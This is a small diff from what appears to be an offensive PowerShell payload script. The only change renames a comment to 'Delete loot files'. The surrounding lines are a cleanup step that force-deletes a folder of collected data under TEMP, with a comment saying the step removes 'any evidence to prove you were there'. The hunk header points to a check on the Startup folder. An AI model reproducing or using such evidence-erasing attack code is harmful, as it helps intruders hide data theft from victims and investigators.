@@ -702,7 +702,7 @@ if(![System.IO.File]::Exists($env:USERPROFILE + "Start Menu\Programs\Startup" + 
 	This is to clean up behind you and remove any evidence to prove you were there
 #>
 
-# Delete your files 
+# Delete loot files 
 
 rm $env:TEMP\$FolderName\* -r -Force -ErrorAction SilentlyContinue
 rmdir $env:TEMP\$FolderName -r -Force -ErrorAction SilentlyContinue
